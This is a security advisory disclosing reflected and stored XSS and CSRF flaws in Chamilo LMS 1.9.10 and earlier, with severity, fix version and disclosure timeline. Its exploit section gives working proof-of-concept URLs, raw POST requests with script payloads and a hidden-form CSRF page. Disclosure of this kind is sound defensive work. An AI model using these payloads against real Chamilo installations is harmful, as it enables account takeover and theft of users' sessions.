@@ -1,0 +1,160 @@
+I. Overview 
+======================================================== 
+Chamilo LMS 1.9.10 or prior versions are prone to a multiple Cross-Site Scripting (Stored + Reflected) & CSRF vulnerabilities. These vulnerabilities allows an attacker to gain control over valid user accounts in LMS, perform operations on their behalf, redirect them to malicious sites, steal their credentials, and more. 
+
+II. Severity 
+======================================================== 
+Rating: High 
+Remote: Yes 
+Authentication Require: Yes 
+CVE-ID: 
+
+III. Vendor's Description of Application 
+======================================================== 
+Chamilo LMS, or Chamilo Learning Management System is a piece of software that allows you to create a virtual campus for the provision of online or semi-online training. It is distributed under the GNU/GPLv3+ license and its development process is public. All the Chamilo software products are entirely free (as in freedom), free (as in beer) and complete, and are production-ready without requiring any type of payment. 
+
+https://chamilo.org/chamilo-lms/ 
+
+IV. Vulnerability Details & Exploit 
+======================================================== 
+1) Multiple Reflected XSS Request 
+
+Request Method = GET 
+
+XSS PoC's:- 
+
+/main/calendar/agenda_list.php?type=personal%27%20onmouseover=%27confirm%280%29%27/%3E%3C!--
+/main/messages/outbox.php?f=social"+onmouseover="confirm(0)
+/main/mySpace/student.php?keyword=31337"+onmouseover=confirm(0)//&active=0&_qf__search_user=&submit=Search
+/main/inc/lib/fckeditor/editor/plugins/ajaxfilemanager/ajax_get_file_listing.php?editor=stand_alone&view=thumbnail&search=1&search_name=admin&search_recursively=0&search_mtime_from=&search_mtime_to=&search_folder=;</script><script>confirm(0)</script>
+/main/admin/configure_extensions.php?display=</script><script>confirm(0)</script>
+/main/admin/course_category.php?action=add&category="/><script>confirm(0)</script>
+/main/admin/session_edit.php?page=resume_session.php%22%20onmouseover=confirm%280%29//&id=1
+
+b) User Agent Header XSS (Reflected)
+GET /main/admin/system_status.php?section=webserver
+User-Agent: <script>confirm(0)</script>
+__________________________________________________________ 
+
+2) Stored XSS 
+
+File Attachment Description parameter (legend[]) is vulnerable to Stored XSS By utilizing "social network" an attacker may send a crafted message to anybody with XSS payload in the file attachment description field (i.e legend[]) 
+
+Request Method : POST 
+Location = /main/messages/new_message.php?f=social 
+Parameter = legend[] 
+
+Stored XSS PoC :- 
+
+POST /main/messages/new_message.php?f=social HTTP/1.1
+Host: 127.0.0.1
+User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:36.0)
+Gecko/20100101 Firefox/36.0
+Accept: text/html,application/xhtml
++xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://127.0.0.1/main/messages/new_message.php?f=social
+Cookie: XXXXXXXXXXXXXXXXXXXXXX
+Connection: keep-alive
+Content-Type: multipart/form-data;
+boundary=---------------------------8461144986726
+Content-Length: 1023
+-----------------------------8461144986726
+Content-Disposition: form-data; name="users[]"
+3
+-----------------------------8461144986726
+Content-Disposition: form-data; name="title"
+Stored XSS Test Via Social network
+-----------------------------8461144986726
+Content-Disposition: form-data; name="content"
+This is test message<BR>
+-----------------------------8461144986726
+Content-Disposition: form-data; name="attach_1"; filename="test.txt"
+Content-Type: text/plain
+I owned you !!!!
+-----------------------------8461144986726
+Content-Disposition: form-data; name="legend[]"
+Cool File <script>confirm(0)</script>
+-----------------------------8461144986726
+Content-Disposition: form-data; name="compose"
+
+-----------------------------8461144986726
+Content-Disposition: form-data; name="_qf__compose_message"
+
+-----------------------------8461144986726
+Content-Disposition: form-data; name="sec_token"
+42917ca29da38f60d49bbaf2ba89b1b9
+-----------------------------8461144986726--
+________________________________________________________________________ 
+
+3) CSRF & Stored XSS Request 
+
+Method = POST 
+Location = /main/admin/session_add.php 
+Parameter = name 
+
+POST /main/admin/session_add.php HTTP/1.1
+Host: 127.0.0.1
+User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:36.0)
+Gecko/20100101 Firefox/36.0
+Accept: text/html,application/xhtml
++xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://127.0.0.1//main/admin/session_add.php
+Cookie:XXXXXXXXXXXXXXXXXXXXXX
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 231
+
+formSent=1&name=<script>confirm(0)</script>&coach_username=rehan&session_category=0&nb_days_acess_before=0&nb_days_acess_after=0&start_limit=on&day_start=2&month_start=3&year_start=2015&end_limit=on&day_end=2&month_end=3&year_end=2016&session_visibility=2
+
+CSRF PoC:-
+
+<html>
+<!-- CSRF Request With Stored XSS Payload -->
+<body>
+<form action="http://127.0.0.1/main/admin/session_add.php"
+method="POST">
+<input type="hidden" name="formSent" value="1" />
+<input type="hidden" name="name"
+value="Test<script>confirm(0)</script>" />
+<input type="hidden" name="coach_username" value="admin" />
+<input type="hidden" name="session_category" value="0" />
+<input type="hidden" name="nb_days_acess_before"
+value="0" />
+<input type="hidden" name="nb_days_acess_after"
+value="0" />
+<input type="hidden" name="start_limit" value="on" />
+<input type="hidden" name="day_start" value="2" />
+<input type="hidden" name="month_start" value="3" />
+<input type="hidden" name="year_start" value="2015" />
+<input type="hidden" name="end_limit" value="on" />
+<input type="hidden" name="day_end" value="2" />
+<input type="hidden" name="month_end" value="3" />
+<input type="hidden" name="year_end" value="2016" />
+<input type="hidden" name="session_visibility" value="1" />
+<input type="submit" value="Submit request" />
+</form>
+</body>
+</html>
+
+
+VI. Affected Systems 
+======================================================== 
+Software: Chamilo LMS 
+Version: 1.9.10 and Prior
+Solution (Fix): Upgrade to 1.9.11 (https://github.com/chamilo/chamilo-lms/)
+
+VII. Vendor Response/Solution 
+======================================================== 
+Vendor Contacted : 02/12/2015 
+Vendor Response : 02/12/2015 
+Patch Release: 03/17/2015 
+Advisory Release: 03/18/2015
+
+VIII.Credits 
+======================================================== 
+Discovered by Rehan Ahmed 
+knight_rehan@hotmail.com     
